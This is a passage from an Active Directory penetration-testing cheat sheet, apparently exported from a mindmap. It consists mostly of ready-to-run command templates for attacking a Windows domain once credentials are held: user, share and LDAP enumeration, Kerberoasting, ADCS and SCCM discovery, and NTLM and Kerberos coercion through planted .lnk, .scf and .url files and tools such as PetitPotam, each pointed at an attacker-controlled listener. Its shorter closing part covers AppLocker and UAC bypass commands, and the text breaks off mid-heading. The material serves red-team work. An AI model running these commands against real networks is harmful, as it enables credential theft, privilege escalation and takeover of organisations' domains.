paths.</p><p><ul><li><code>PingCastle</code>, <code>adPEAS</code></li></ul></p><p> • <strong>Intent:</strong> Automated AD health check.</p><p> • <strong>Purpose:</strong> Identify misconfigs, weak links.</p><p><ul><li><code>GetUserSPNs.py</code>, <code>Rubeus kerberoast</code></li></ul></p><p> • <strong>Intent:</strong> Request TGS for SPN accounts.</p><p> • <strong>Purpose:</strong> Kerberoasting → offline crack.</p><p><ul><li>File coercion (<code>slinky</code>, <code>sucffy</code>, <code>ntlm_theft</code>)</li></ul></p><p> • <strong>Intent:</strong> Plant files to force NTLM auth.</p><p> • <strong>Purpose:</strong> Coerce creds to attacker-controlled listener.</p><p><ul><li>Webdav, RPC, Kerberos coercion (PetitPotam, coercer, etc.)</li></ul></p><p> • <strong>Intent:</strong> Trigger NTLM/Kerberos auth.</p><p> • <strong>Purpose:</strong> Relay / escalate via MITM.</p><p><ul><li><code>nxc ldap ... get-desc-users</code></li></ul></p><p> • <strong>Intent:</strong> Find MSOL accounts.</p><p> • <strong>Purpose:</strong> Cloud/hybrid takeover.</p><p></p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Classic_Enumeration_(users,_shares,_ACL,_delegation,_...)_1020.html"></a><h1 class='title level-3'>Classic Enumeration (users, shares, ACL, delegation, ...)</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p></p><p>## Classic Enumeration (users, shares, ACL, delegation, ...)</p><p><ul><li>Find all users &gt;&gt;&gt; Username  [<a href="#Domain_Dominance--Valid_User_(no_password)_968.html">Valid User (no password)</a>]</li></ul></p><p>  - `GetADUsers.py -all -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;username&gt;`</p><p>  - `nxc smb &lt;dc_ip&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; --users`<ul><li>Enumerate SMB share &gt;&gt;&gt; Scroll shares [<a href="#Domain_Dominance--Quick_Compromise_967.html">Quick Compromise</a>]</li></ul></p><p>  - `nxc smb &lt;ip_range&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; -M spider_plus`</p><p>  - `nxc smb &lt;ip_range&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; --shares [--get-file \\&lt;filename&gt; &lt;filename&gt;] `</p><p>  - `manspider &lt;ip_range&gt; -c passw -e &lt;file extensions&gt; -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt;`<ul><li>Bloodhound Legacy &gt;&gt;&gt; ACL [<a href="#Domain_Dominance--ACLs-ACEs_Permissions_974.html">ACLs/ACEs Permissions</a>] || Delegation [<a href="#Domain_Dominance--Kerberos_Delegation_975.html">Kerberos Delegation</a>] || Username [<a href="#Domain_Dominance--Valid_User_(no_password)_968.html">Valid User (no password)</a>]</li></ul></p><p>  - `bloodhound-python -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; -gc &lt;dc&gt; -c all`</p><p>  - `rusthound -d &lt;domain_to_enum&gt; -u &#39;&lt;user&gt;@&lt;domain&gt;&#39; -p &#39;&lt;password&gt;&#39; -o &lt;outfile.zip&gt; -z`</p><p>  - `import-module sharphound.ps1;invoke-bloodhound -collectionmethod all -domain &lt;domain&gt;`</p><p>  - `sharphound.exe -c all -d &lt;domain&gt;`<ul><li>Bloodhound CE &gt;&gt;&gt; ACL [<a href="#Domain_Dominance--ACLs-ACEs_Permissions_974.html">ACLs/ACEs Permissions</a>] || Delegation [<a href="#Domain_Dominance--Kerberos_Delegation_975.html">Kerberos Delegation</a>] || Username [<a href="#Domain_Dominance--Valid_User_(no_password)_968.html">Valid User (no password)</a>]</li></ul></p><p>  - `bloodhound-python -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; -gc &lt;dc&gt; -c all`</p><p>  - `rusthound-ce -d &lt;domain_to_enum&gt; -u &#39;&lt;user&gt;@&lt;domain&gt;&#39; -p &#39;&lt;password&gt;&#39; -o &lt;outfile.zip&gt; -z --ldap-filter=(objectGuid=*)`</p><p>  - `sharphound.exe -c all -d &lt;domain&gt;`</p><p>  - `SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output --autosplit --threshold 900`<ul><li>Enumerate Ldap &gt;&gt;&gt; ACL [<a href="#Domain_Dominance--ACLs-ACEs_Permissions_974.html">ACLs/ACEs Permissions</a>] || Delegation [<a href="#Domain_Dominance--Kerberos_Delegation_975.html">Kerberos Delegation</a>] || Username [<a href="#Domain_Dominance--Valid_User_(no_password)_968.html">Valid User (no password)</a>]</li></ul></p><p>  - `ldeep ldap -u &lt;users&gt; -p &#39;&lt;password&gt;&#39; -d &lt;domain&gt; -s ldap://&lt;dc_ip&gt; all &lt;backup_folder&gt;`</p><p>  - `ldapdomaindump.py -u &lt;user&gt; -p &lt;password&gt; -o &lt;dump_folder&gt; ldap://&lt;dc_ip&gt;:389`</p><p>  - `ldapsearch-ad.py -l &lt;dc_ip&gt; -d &lt;domain&gt; -u &lt;user&gt; -p &#39;&lt;password&gt;&#39; -o &lt;output.log&gt; -t all`<ul><li>Enumerate DNS &gt;&gt;&gt; New targets (low hanging fruit) [<a href="#Domain_Dominance--Quick_Compromise_967.html">Quick Compromise</a>]</li></ul></p><p>  - `adidnsdump -u &lt;domain&gt;\\&lt;user&gt; -p &quot;&lt;password&gt;&quot; --print-zones &lt;dc_ip&gt;`</p></div><div class='page'><a name="--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Classic_Enumeration_(users,_shares,_ACL,_delegation,_...)--Find_all_users_1151.html"></a><h1 class='title level-4'>Find all users</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Classic Enumeration (users, shares, ACL, delegation, ...)</p><p>### Find all users &gt;&gt;&gt; Username [<a href="#Domain_Dominance--Valid_User_(no_password)_968.html">Valid User (no password)</a>]</p><p></p><p>GetADUsers.py -all -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;username&gt;</p><p></p><p>nxc smb &lt;dc_ip&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; --users</p></div><div class='page'><a name="id_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Classic_Enumeration_(users,_shares,_ACL,_delegation,_...)--Enumerate_SMB_share_1152.html"></a><h1 class='title level-4'>Enumerate SMB share</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Classic Enumeration (users, shares, ACL, delegation, ...)</p><p>### Enumerate SMB share &gt;&gt;&gt; Scroll shares [<a href="#Domain_Dominance--Quick_Compromise_967.html">Quick Compromise</a>]</p><p></p><p>nxc smb &lt;ip_range&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; -M spider_plus</p><p></p><p>nxc smb &lt;ip_range&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; --shares [--get-file \\&lt;filename&gt; &lt;filename&gt;] </p><p></p><p>manspider &lt;ip_range&gt; -c passw -e &lt;file extensions&gt; -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt;</p></div><div class='page'><a name="alid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Classic_Enumeration_(users,_shares,_ACL,_delegation,_...)--Bloodhound_Legacy_1153.html"></a><h1 class='title level-4'>Bloodhound Legacy</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Classic Enumeration (users, shares, ACL, delegation, ...)</p><p>### Bloodhound Legacy &gt;&gt;&gt; ACL [<a href="#Domain_Dominance--ACLs-ACEs_Permissions_974.html">ACLs/ACEs Permissions</a>] || Delegation [<a href="#Domain_Dominance--Kerberos_Delegation_975.html">Kerberos Delegation</a>] || Username [<a href="#Domain_Dominance--Valid_User_(no_password)_968.html">Valid User (no password)</a>]</p><p></p><p>bloodhound-python -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; -gc &lt;dc&gt; -c all</p><p></p><p>rusthound -d &lt;domain_to_enum&gt; -u &#39;&lt;user&gt;@&lt;domain&gt;&#39; -p &#39;&lt;password&gt;&#39; -o &lt;outfile.zip&gt; -z</p><p></p><p>import-module sharphound.ps1;invoke-bloodhound -collectionmethod all -domain &lt;domain&gt;</p><p></p><p>sharphound.exe -c all -d &lt;domain&gt;</p></div><div class='page'><a name="e--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Classic_Enumeration_(users,_shares,_ACL,_delegation,_...)--Bloodhound_CE_1154.html"></a><h1 class='title level-4'>Bloodhound CE</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Classic Enumeration (users, shares, ACL, delegation, ...)</p><p>### Bloodhound CE &gt;&gt;&gt; ACL [<a href="#Domain_Dominance--ACLs-ACEs_Permissions_974.html">ACLs/ACEs Permissions</a>] || Delegation [<a href="#Domain_Dominance--Kerberos_Delegation_975.html">Kerberos Delegation</a>] || Username [<a href="#Domain_Dominance--Valid_User_(no_password)_968.html">Valid User (no password)</a>]</p><p></p><p>bloodhound-python -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; -gc &lt;dc&gt; -c all</p><p></p><p>rusthound-ce -d &lt;domain_to_enum&gt; -u &#39;&lt;user&gt;@&lt;domain&gt;&#39; -p &#39;&lt;password&gt;&#39; -o &lt;outfile.zip&gt; -z --ldap-filter=(objectGuid=*)</p><p></p><p>sharphound.exe -c all -d &lt;domain&gt;</p><p></p><p>SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output --autosplit --threshold 900</p></div><div class='page'><a name="--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Classic_Enumeration_(users,_shares,_ACL,_delegation,_...)--Enumerate_Ldap_1155.html"></a><h1 class='title level-4'>Enumerate Ldap</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Classic Enumeration (users, shares, ACL, delegation, ...)</p><p>### Enumerate Ldap &gt;&gt;&gt; ACL [<a href="#Domain_Dominance--ACLs-ACEs_Permissions_974.html">ACLs/ACEs Permissions</a>] || Delegation [<a href="#Domain_Dominance--Kerberos_Delegation_975.html">Kerberos Delegation</a>] || Username [<a href="#Domain_Dominance--Valid_User_(no_password)_968.html">Valid User (no password)</a>]</p><p></p><p>ldeep ldap -u &lt;users&gt; -p &#39;&lt;password&gt;&#39; -d &lt;domain&gt; -s ldap://&lt;dc_ip&gt; all &lt;backup_folder&gt;</p><p></p><p>ldapdomaindump.py -u &lt;user&gt; -p &lt;password&gt; -o &lt;dump_folder&gt; ldap://&lt;dc_ip&gt;:389</p><p></p><p>ldapsearch-ad.py -l &lt;dc_ip&gt; -d &lt;domain&gt; -u &lt;user&gt; -p &#39;&lt;password&gt;&#39; -o &lt;output.log&gt; -t all</p></div><div class='page'><a name="e--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Classic_Enumeration_(users,_shares,_ACL,_delegation,_...)--Enumerate_DNS_1156.html"></a><h1 class='title level-4'>Enumerate DNS</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Classic Enumeration (users, shares, ACL, delegation, ...)</p><p>### Enumerate DNS &gt;&gt;&gt; New targets (low hanging fruit) [<a href="#Domain_Dominance--Quick_Compromise_967.html">Quick Compromise</a>]</p><p></p><p>adidnsdump -u &lt;domain&gt;\\&lt;user&gt; -p &quot;&lt;password&gt;&quot; --print-zones &lt;dc_ip&gt;</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Enumerate_ADCS_1021.html"></a><h1 class='title level-3'>Enumerate ADCS</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Enumerate ADCS &gt;&gt;&gt; ADCS Exploitation [<a href="#Domain_Dominance--ADCS_976.html">ADCS</a>]</p><p></p><p>certify.exe find</p><p></p><p>certipy find -u &lt;user&gt;@&lt;domain&gt; -p &#39;&lt;password&gt;&#39; -dc-ip &lt;dc_ip&gt;</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Enumerate_SCCM_1022.html"></a><h1 class='title level-3'>Enumerate SCCM</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Enumerate SCCM &gt;&gt;&gt; SCCM Exploitation [<a href="#Domain_Dominance--SCCM_977.html">SCCM</a>]</p><p></p><p>sccmhunter.py find -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -dc-ip &lt;dc_ip&gt; -debug</p><p></p><p>ldeep ldap -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; -s ldap://&lt;dc_ip&gt; sccm</p><p></p><p>SharpSCCM.exe local site-info</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Scan_Auto_1023.html"></a><h1 class='title level-3'>Scan Auto</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Scan Auto</p><p></p><p>PingCastle.exe --healthcheck --server &lt;domain&gt;</p><p></p><p>Import-Module .\adPEAS.ps1; Invoke-adPEAS -Domain &#39;&lt;domain&gt;&#39; -Server &#39;&lt;dc_fqdn&gt;&#39;</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Scan_Auto--From_BH_result_1157.html"></a><h1 class='title level-4'>From BH result</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Scan Auto</p><p>### From BloodHound result</p><p></p><p>AD-miner -c -cf Report -u &lt;neo4j_username&gt; -p &lt;neo4j_password&gt;</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Kerberoasting_1024.html"></a><h1 class='title level-3'>Kerberoasting</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Kerberoasting &gt;&gt;&gt; Hash TGS [<a href="#Domain_Dominance--Crack_Hashes_970.html">Crack Hashes</a>]</p><p></p><p>MATCH (u:User) WHERE u.hasspn=true AND u.enabled = true AND NOT u.objectid ENDS WITH &#39;-502&#39; AND NOT COALESCE(u.gmsa, false) = true AND NOT COALESCE(u.msa, false) = true RETURN u</p><p></p><p>GetUserSPNs.py -request -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;</p><p></p><p>Rubeus.exe kerberoast</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Coerce_1025.html"></a><h1 class='title level-3'>Coerce</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p></p><p>## Coerce<ul><li>Drop file</li></ul></p><p>  - .lnk</p><p>    - `nxc smb &lt;dc_ip&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; -M slinky -o NAME=&lt;filename&gt; SERVER=&lt;attacker_ip&gt;`</p><p>  - .scf</p><p>    - `nxc smb &lt;dc_ip&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; -M sucffy -o NAME=&lt;filename&gt; SERVER=&lt;attacker_ip&gt;`</p><p>  - .url</p><p>    - `[InternetShortcut]... IconFile=\\&lt;attacker_ip&gt;\%USERNAME%.icon`</p><p>  - Other files</p><p>    - `ntlm_theft.py -g all -s &lt;your_ip&gt; -f test`<ul><li>Webdav</li></ul></p><p>  - Enable webclient</p><p>    - .searchConnector-ms<ul><li>`nxc smb &lt;dc_ip&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; -M drop-sc`</li></ul></p><p>  - add attack computer in dns</p><p>    - `dnstool.py -u &lt;domain&gt;\&lt;user&gt; -p &lt;pass&gt; --record &lt;attack_name&gt; --action add --data &lt;ip_attacker&gt; &lt;dc_ip&gt;`</p><p>  - Launch coerce with &lt;attacker_hostname&gt;@80/x as target &gt;&gt;&gt; HTTP Coerce [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>]<ul><li>RPC call &gt;&gt;&gt; SMB NTLM Coerce [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>]</li></ul></p><p>  - `printerbug.py &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;printer_ip&gt; &lt;listener_ip&gt;`</p><p>  - `petitpotam.py -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; &lt;listnerer_ip&gt; &lt;target_ip&gt;`</p><p>  - `coercer.py -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; -t &lt;target&gt; -l &lt;attacker_ip&gt;`<ul><li>Coerce kerberos &gt;&gt;&gt; SMB Kerberos coerce [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>]</li></ul></p><p>  - `dnstool.py -u &quot;&lt;domain&gt;\&lt;user&gt;&quot; -p &#39;&lt;password&gt;&#39; -d &quot;&lt;attacker_ip&gt;&quot; --action add &quot;&lt;dns_server_ip&gt;&quot; -r &quot;&lt;servername&gt;1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA&quot; --tcp`</p><p>    - `petitpotam.py -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; -d &lt;domain&gt; &#39;&lt;servername&gt;1UWh...&#39; &lt;target&gt;`</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Coerce--Drop_file_1158.html"></a><h1 class='title level-4'>Drop file</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p></p><p>## Coerce<ul><li>Drop file</li></ul></p><p>  - .lnk</p><p>    - `nxc smb &lt;dc_ip&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; -M slinky -o NAME=&lt;filename&gt; SERVER=&lt;attacker_ip&gt;`</p><p>  - .scf</p><p>    - `nxc smb &lt;dc_ip&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; -M sucffy -o NAME=&lt;filename&gt; SERVER=&lt;attacker_ip&gt;`</p><p>  - .url</p><p>    - `[InternetShortcut]... IconFile=\\&lt;attacker_ip&gt;\%USERNAME%.icon`</p><p>  - Other files</p><p>    - `ntlm_theft.py -g all -s &lt;your_ip&gt; -f test`</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Coerce--Drop_file--.Lnk_1163.html"></a><h1 class='title level-5'>.Lnk</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Coerce</p><p>### Drop file</p><p>#### .lnk</p><p></p><p>nxc smb &lt;dc_ip&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; -M slinky -o NAME=&lt;filename&gt; SERVER=&lt;attacker_ip&gt;</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Coerce--Drop_file--.scf_1164.html"></a><h1 class='title level-5'>.scf</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Coerce</p><p>### Drop file</p><p>#### .scf</p><p></p><p>nxc smb &lt;dc_ip&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; -M sucffy -o NAME=&lt;filename&gt; SERVER=&lt;attacker_ip&gt;</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Coerce--Drop_file--.url_1165.html"></a><h1 class='title level-5'>.url</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Coerce</p><p>### Drop file</p><p>#### .url</p><p></p><p>[InternetShortcut]... IconFile=\\&lt;attacker_ip&gt;\%USERNAME%.icon</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Coerce--Drop_file--Other_files_1166.html"></a><h1 class='title level-5'>Other files</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Coerce</p><p>### Other files</p><p></p><p>ntlm_theft.py -g all -s &lt;your_ip&gt; -f test</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Coerce--Webdav_1160.html"></a><h1 class='title level-4'>Webdav</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p></p><p>## Coerce</p><p><ul><li>Webdav</li></ul></p><p>  - Enable webclient</p><p>    - .searchConnector-ms<ul><li>`nxc smb &lt;dc_ip&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; -M drop-sc`</li></ul></p><p>  - add attack computer in dns</p><p>    - `dnstool.py -u &lt;domain&gt;\&lt;user&gt; -p &lt;pass&gt; --record &lt;attack_name&gt; --action add --data &lt;ip_attacker&gt; &lt;dc_ip&gt;`</p><p>  - Launch coerce with &lt;attacker_hostname&gt;@80/x as target &gt;&gt;&gt; HTTP Coerce [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>]</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Coerce--Webdav--Enable_webclient_1167.html"></a><h1 class='title level-5'>Enable webclient</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Coerce</p><p>### Webdav</p><p>#### Enable webclient</p><p></p><p>.searchConnector-ms </p><p></p><p>&gt;&gt;	nxc smb &lt;dc_ip&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; -M drop-sc</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Coerce--Webdav--Add_attack_computer_in_dns_1168.html"></a><h1 class='title level-5'>Add attack computer in dns</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Coerce</p><p>### Webdav</p><p>#### Add attack computer in dns</p><p></p><p>dnstool.py -u &lt;domain&gt;\&lt;user&gt; -p &lt;pass&gt; --record &lt;attack_name&gt; --action add --data &lt;ip_attacker&gt; &lt;dc_ip&gt;</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Coerce--Webdav--Launch_1169.html"></a><h1 class='title level-5'>Launch</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Coerce</p><p>### Webdav</p><p>#### Launch &gt;&gt;&gt; HTTP Coerce [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>]</p><p></p><p>Launch coerce with &lt;attacker_hostname&gt;@80/x as target &gt;&gt;&gt; HTTP Coerce [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>]</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Coerce--RPC_call_1161.html"></a><h1 class='title level-4'>RPC call</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Coerce</p><p>### RPC call &gt;&gt;&gt; SMB NTLM Coerce [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>]</p><p></p><p>printerbug.py &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;printer_ip&gt; &lt;listener_ip&gt;</p><p></p><p>petitpotam.py -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; &lt;listnerer_ip&gt; &lt;target_ip&gt;</p><p></p><p>coercer.py -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; -t &lt;target&gt; -l &lt;attacker_ip&gt;</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Coerce--Coerce_kerberos_1162.html"></a><h1 class='title level-4'>Coerce kerberos</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Coerce</p><p>### Coerce kerberos &gt;&gt;&gt; SMB Kerberos coerce [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>]</p><p></p><p>dnstool.py -u &quot;&lt;domain&gt;\&lt;user&gt;&quot; -p &#39;&lt;password&gt;&#39; -d &quot;&lt;attacker_ip&gt;&quot; --action add &quot;&lt;dns_server_ip&gt;&quot; -r &quot;&lt;servername&gt;1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA&quot; --tcp</p><p></p><p>&gt;&gt;	petitpotam.py -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; -d &lt;domain&gt; &#39;&lt;servername&gt;1UWh...&#39; &lt;target&gt; &gt;&gt;&gt; SMB Kerberos coerce [<a href="#Domain_Dominance--Man-in-the-Middle_(MitM)_969.html">Man-in-the-Middle (MitM)</a>]</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Intra_ID_Connect_1026.html"></a><h1 class='title level-3'>Intra ID Connect</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Intra ID Connect</p><p>### Find MSOL</p><p></p><p>nxc ldap &lt;dc_ip&gt; -u &#39;&lt;user&gt;&#39; -p &#39;&lt;password&gt;&#39; -M get-desc-users |grep -i MSOL</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Can_Connect_to_a_computer_1027.html"></a><h1 class='title level-3'>Can Connect to a computer</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Can Connect to a computer &gt;&gt;&gt; Lateral move [<a href="#Domain_Dominance--Lateral_Movement_979.html">Lateral Movement</a>]</p></div><div class='page'><a name="Domain_Dominance--Valid_Credentials_(cleartext,_NT_hash,_Kerberos_ticket)--Exploit_1028.html"></a><h1 class='title level-3'>Exploit</h1><br/><p># Valid Credentials (cleartext creds, nt hash, kerberos ticket)</p><p>## Exploit &gt;&gt;&gt; known vulnerabilities [<a href="#Domain_Dominance--Known_Vulnerabilities_(Authenticated)_973.html">Known Vulnerabilities (Authenticated)</a>]</p></div><div class='page'><a name="Domain_Dominance--Low_Access_(priv_esc)_972.html"></a><h1 class='title level-2'>Low Access (priv esc)</h1><br/><p><ul><li>Applocker bypass (<code>installutil.exe</code>, <code>mshta.exe</code>)</li></ul></p><p> • <strong>Intent:</strong> Execute code bypassing whitelisting.</p><p> • <strong>Purpose:</strong> Run arbitrary binaries/scripts.</p><p><ul><li>UAC bypass (<code>fodhelper.exe</code>, <code>wsreset.exe</code>)</li></ul></p><p> • <strong>Intent:</strong> Escalate integrity level.</p><p> • <strong>Purpose:</strong> Become Admin from low-priv user.</p><p><ul><li>Auto-enum (<code>winPEAS</code>, <code>PrivescCheck</code>)</li></ul></p><p> • <strong>Intent:</strong> Automated priv esc discovery.</p><p> • <strong>Purpose:</strong> Spot escalation vectors.</p><p><ul><li>File search (<code>findstr &#39;pass&#39;</code>)</li></ul></p><p> • <strong>Intent:</strong> Search local files for creds.</p><p> • <strong>Purpose:</strong> Collect cleartext secrets.</p><p><ul><li>CVEs (SMBGhost, HiveNightmare)</li></ul></p><p> • <strong>Intent:</strong> Exploit kernel/local vuln.</p><p> • <strong>Purpose:</strong> Escalate to SYSTEM.</p><p><ul><li>WebDAV + PetitPotam</li></ul></p><p> • <strong>Intent:</strong> Trigger NTLM coercion.</p><p> • <strong>Purpose:</strong> Relay attack.</p><p><ul><li>KrbRelayUp</li></ul></p><p> • <strong>Intent:</strong> Abuse Kerberos relay to add machine account.</p><p> • <strong>Purpose:</strong> Escalate to admin via RBCD.</p><p><ul><li>Potato family (RoguePotato, PrintSpoofer, etc.)</li></ul></p><p> • <strong>Intent:</strong> Abuse SeImpersonate.</p><p> • <strong>Purpose:</strong> Escalate to SYSTEM.</p><p></p></div><div class='page'><a name="Domain_Dominance--Low_Access_(priv_esc)--Bypass_Applocker_1029.html"></a><h1 class='title level-3'>Bypass Applocker</h1><br/><p># Low access (Privilege escalation)</p><p>## Bypass Applocker &gt;&gt;&gt; Low access (without applocker) [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>]</p><p></p><p>installutil.exe /logfile= /LogToConsole=false /U C:\runme.exe</p><p></p><p>mshta.exe my.hta</p><p></p><p>MsBuild.exe pshell.xml</p></div><div class='page'><a name="Domain_Dominance--Low_Access_(priv_esc)--Bypass_Applocker--Get-Applocker_Info_1170.html"></a><h1 class='title level-4'>Get-Applocker Info</h1><br/><p># Low access (Privilege escalation)</p><p>## Bypass Applocker &gt;&gt;&gt; Low access (without applocker) [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>]</p><p>### Get-Applocker info</p><p></p><p>Get-ChildItem -Path HKLM:\SOFTWARE\Policies \Microsoft\Windows\SrpV2\Exe (dll/msi/...)</p></div><div class='page'><a name="Domain_Dominance--Low_Access_(priv_esc)--Bypass_Applocker--Files_in_Writable_Paths_1171.html"></a><h1 class='title level-4'>Files in Writable Paths</h1><br/><p># Low access (Privilege escalation)</p><p>## Bypass Applocker &gt;&gt;&gt; Low access (without applocker) [<a href="#Domain_Dominance--Low_Access_(priv_esc)_972.html">Low Access (priv esc)</a>]</p><p>### Files in writables 